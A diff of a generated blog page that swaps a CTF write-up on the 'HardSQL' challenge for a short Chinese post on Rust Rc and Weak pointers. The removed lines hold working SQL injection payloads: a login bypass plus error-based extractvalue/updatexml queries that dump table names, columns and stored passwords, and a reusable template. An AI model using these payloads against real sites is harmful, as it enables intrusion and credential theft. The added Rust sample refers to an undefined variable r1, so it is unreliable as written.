@@ -23,22 +23,22 @@
     var NexT = window.NexT || {};
     var CONFIG = {"hostname":"xh-gotz9.github.io","root":"/","images":"/images","scheme":"Mist","version":"8.1.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
-<meta name="description" content="熬夜是没有好事的, 反应慢, 眼睛疼, 根本做不动题. 审题还好歪打正着, 没走太多弯路. 早上起来, 将就晚上写的 payload 操作一下就过了.">
+<meta name="description" content="Rust 智能指针的用法总结 v0.1.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="极客大挑战2019 - HardSQL">
-<meta property="og:url" content="https://xh-gotz9.github.io/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-HardSQL/index.html">
+<meta property="og:title" content="Rust - 智能指针">
+<meta property="og:url" content="https://xh-gotz9.github.io/rust-smart-pointers/index.html">
 <meta property="og:site_name" content="Log Horizon">
-<meta property="og:description" content="熬夜是没有好事的, 反应慢, 眼睛疼, 根本做不动题. 审题还好歪打正着, 没走太多弯路. 早上起来, 将就晚上写的 payload 操作一下就过了.">
+<meta property="og:description" content="Rust 智能指针的用法总结 v0.1.">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2020-06-28T04:42:16.000Z">
-<meta property="article:modified_time" content="2020-06-28T05:10:25.535Z">
+<meta property="article:published_time" content="2020-12-12T18:36:47.000Z">
+<meta property="article:modified_time" content="2020-12-13T17:15:16.386Z">
 <meta property="article:author" content="gotz9">
-<meta property="article:tag" content="writeup">
-<meta property="article:tag" content="SQLI">
+<meta property="article:tag" content="Rust">
+<meta property="article:tag" content="智能指针">
 <meta name="twitter:card" content="summary">
 
 
-<link rel="canonical" href="https://xh-gotz9.github.io/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-HardSQL/">
+<link rel="canonical" href="https://xh-gotz9.github.io/rust-smart-pointers/">
 
 
 <script class="page-configurations">
@@ -50,7 +50,7 @@
     lang   : 'zh-CN'
   };
 </script>
-<title>极客大挑战2019 - HardSQL | Log Horizon</title>
+<title>Rust - 智能指针 | Log Horizon</title>
   
 
 
@@ -148,7 +148,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <section class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%A1%E9%A2%98"><span class="nav-number">1.</span> <span class="nav-text">审题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95-WAF"><span class="nav-number">2.</span> <span class="nav-text">测试 WAF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%99%BB%E9%99%86"><span class="nav-number">3.</span> <span class="nav-text">万能密码登陆</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">4.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload"><span class="nav-number">5.</span> <span class="nav-text">payload</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%95%E7%94%A8%E8%AE%A1%E6%95%B0-Rc"><span class="nav-number">1.</span> <span class="nav-text">引用计数 - Rc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%B1%E5%BC%95%E7%94%A8"><span class="nav-number">1.1.</span> <span class="nav-text">弱引用</span></a></li></ol></li></ol></div>
         </section>
         <!--/noindex-->
 
@@ -209,7 +209,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://xh-gotz9.github.io/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-HardSQL/">
+    <link itemprop="mainEntityOfPage" href="https://xh-gotz9.github.io/rust-smart-pointers/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -222,7 +222,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          极客大挑战2019 - HardSQL
+          Rust - 智能指针
         </h1>
 
         <div class="post-meta-container">
@@ -232,21 +232,27 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2020-06-28 12:42:16 / 修改时间：13:10:25" itemprop="dateCreated datePublished" datetime="2020-06-28T12:42:16+08:00">2020-06-28</time>
+      <time title="创建时间：2020-12-13 02:36:47" itemprop="dateCreated datePublished" datetime="2020-12-13T02:36:47+08:00">2020-12-13</time>
     </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2020-12-14 01:15:16" itemprop="dateModified" datetime="2020-12-14T01:15:16+08:00">2020-12-14</time>
+      </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-folder"></i>
       </span>
       <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+          <a href="/categories/%E5%BC%80%E5%8F%91/" itemprop="url" rel="index"><span itemprop="name">开发</span></a>
         </span>
           ，
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/CTF/BUUCTF/" itemprop="url" rel="index"><span itemprop="name">BUUCTF</span></a>
+          <a href="/categories/%E5%BC%80%E5%8F%91/Rust/" itemprop="url" rel="index"><span itemprop="name">Rust</span></a>
         </span>
     </span>
 
@@ -260,23 +266,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <p>熬夜是没有好事的, 反应慢, 眼睛疼, 根本做不动题.</p>
-<p>审题还好歪打正着, 没走太多弯路. 早上起来, 将就晚上写的 payload 操作一下就过了.</p>
+        <p>Rust 智能指针的用法总结 v0.1.</p>
 <a id="more"></a>
-<h2 id="审题"><a href="#审题" class="headerlink" title="审题"></a>审题</h2><p>一个简单的登陆, 先是加单引号出现报错, 在 username 栏加单引号的话, 从报错信息可以看出 password 用的是明文, 可以加以利用. 同时推测 WHERE 条件是 <code>username = &#39;?&#39; and password = &#39;?&#39;</code>.</p>
-<p>首先尝试万能密码, 发现被检测了, 也是嘛, 题目也说了爆肝 SQL 注入了, 这肯定有 waf.</p>
-<h2 id="测试-WAF"><a href="#测试-WAF" class="headerlink" title="测试 WAF"></a>测试 WAF</h2><p>被检测的字符:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96; &#96;, &#96;and&#96;, &#96;if&#96;, &#96;union&#96;, &#96;&amp;&#96;, &#96;|&#96;</span><br></pre></td></tr></table></figure>
 
-<p>晚上实在有点困, 眼皮打架, 没心思测 waf, 测了一点常用的之后就直接开搞了.</p>
-<h2 id="万能密码登陆"><a href="#万能密码登陆" class="headerlink" title="万能密码登陆"></a>万能密码登陆</h2><p>没啥好说的直接上 payload 了:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 将SQL改写为: username &#x3D; &#39;x&#39;or(not&#39; and password&#x3D;&#39;^&#39;x&#39;)#&#39;</span><br><span class="line">?username&#x3D;x&#39;or(not</span><br><span class="line">&amp;password&#x3D;^&#39;x&#39;)#</span><br></pre></td></tr></table></figure>
+<h2 id="引用计数-Rc"><a href="#引用计数-Rc" class="headerlink" title="引用计数 - Rc"></a>引用计数 - Rc</h2><p><code>Rc</code> 是引用计数指针, 如果需要在别处长期保留引用, 需要为指针添加计数. 此时应该调用 <code>Rc::clone</code> 来为指针添加计数, 而不是直接保留 <code>Rc</code> 对象或其引用.</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> rc = Rc::new(<span class="number">5</span>);</span><br><span class="line"><span class="keyword">let</span> new_rc = Rc::clone(&amp;rc);</span><br></pre></td></tr></table></figure>
 
-<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>绕过后没有给 flag, 才想起了报错注入. 正好绕过的时候吧 WHERE 逻辑改写成 OR 组合, 不会被’短路’, 直接接着改了.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM user WHERE uname &#x3D; a&#39;or(&#39; AND password &#x3D; &#39;^&#39;a&#39;)or(updatexml(&#39;ab&#39;,concat(&#39;~&#39;,(select(group_concat(table_name)from(information_schema.tables)where((table_schema)like(database())))))))#&#39;</span><br><span class="line"># H4rDsq1</span><br><span class="line"></span><br><span class="line">?username&#x3D;a&#39;or(</span><br><span class="line">&amp;password&#x3D;^&#39;a&#39;)or(extractvalue(&#39;ab&#39;,concat(&#39;~&#39;,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H4rDsq1&#39;))))))%23</span><br><span class="line"># id, username, password</span><br><span class="line"></span><br><span class="line">?username&#x3D;a&#39;or(</span><br><span class="line">&amp;password&#x3D;^&#39;a&#39;)or(extractvalue(&#39;ab&#39;,concat(&#39;~&#39;,(SELECT(GROUP_CONCAT(username))FROM(H4rDsq1)),20)))%23</span><br><span class="line"># flag</span><br><span class="line"></span><br><span class="line">?username&#x3D;a&#39;or(</span><br><span class="line">&amp;password&#x3D;^&#39;a&#39;)or(extractvalue(&#39;ab&#39;,concat(&#39;~&#39;,right((SELECT(GROUP_CONCAT(password))FROM(H4rDsq1)),20))))%23</span><br></pre></td></tr></table></figure>
-<p>由于报错信息有数据长度限制, 用字符串截取函数即可 (WAF 检测了 <code>substring</code> 函数, 用了 <code>right</code>).</p>
-<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>改良后的 payload 如下, <code>&lt;INJECT&gt;</code> 的 SQL 语句注意绕过 WAF 即可.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;a&#39;or(extractvalue(</span><br><span class="line">&amp;password&#x3D;,concat(&#39;~&#39;,(&lt;INJECT&gt;))))%23</span><br></pre></td></tr></table></figure>
+<h3 id="弱引用"><a href="#弱引用" class="headerlink" title="弱引用"></a>弱引用</h3><p><code>Rc::clone</code> 会创建一个强引用, 如果多个强引用间有循环引用, 会导致它们无法被计数归零, 因此无法而顺利回收. <code>Rc::downgrade</code> 可以创建一个 <code>Rc&lt;T&gt;</code> 指针的弱引用指针 <code>Weak&lt;T&gt;</code>. 弱引用不会增加强引用计数, 自然也无法影响 数据的回收.</p>
+<p>弱引用因为不会阻止引用的数据被清理, 所以要调用 <code>upgrade</code> 尝试获取获取强引用, 来保证数据在自身使用期间不会被清理.</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> r_out_weak;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> r = Rc::new(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">let</span> r_weak = Rc::downgrade(&amp;r);</span><br><span class="line">    r_out_weak = Rc::downgrade(&amp;r);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">assert_eq!</span>(Rc::strong_count(&amp;r), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">let</span> r_strong = r1.upgrade();</span><br><span class="line">    <span class="built_in">assert_eq!</span>(Rc::strong_count(&amp;r), <span class="number">2</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">assert_eq!</span>(r1.upgrade().and_then(|x| <span class="literal">Some</span>(x.as_ref().clone())), <span class="literal">Some</span>(<span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> r_out_strong = r_out_weak.upgrade();</span><br><span class="line"><span class="comment">// r_out_weak 引用的 r 数据失效</span></span><br><span class="line"><span class="built_in">assert_eq!</span>(r_out_strong, <span class="literal">None</span>);</span><br></pre></td></tr></table></figure>
     </div>
 
     
@@ -285,22 +283,19 @@
 
     <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/writeup/" rel="tag"># writeup</a>
-              <a href="/tags/SQLI/" rel="tag"># SQLI</a>
+              <a href="/tags/Rust/" rel="tag"># Rust</a>
+              <a href="/tags/%E6%99%BA%E8%83%BD%E6%8C%87%E9%92%88/" rel="tag"># 智能指针</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz/" rel="prev" title="网鼎杯2020 青龙组 - AreUSerialz">
-                  <i class="fa fa-chevron-left"></i> 网鼎杯2020 青龙组 - AreUSerialz
+                <a href="/Spring-Security-%E6%A1%86%E6%9E%B6%E6%A6%82%E8%A7%88/" rel="prev" title="Spring Security 框架概览">
+                  <i class="fa fa-chevron-left"></i> Spring Security 框架概览
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/blanc-and-noir/" rel="next" title="blanc & noir">
-                  blanc & noir <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
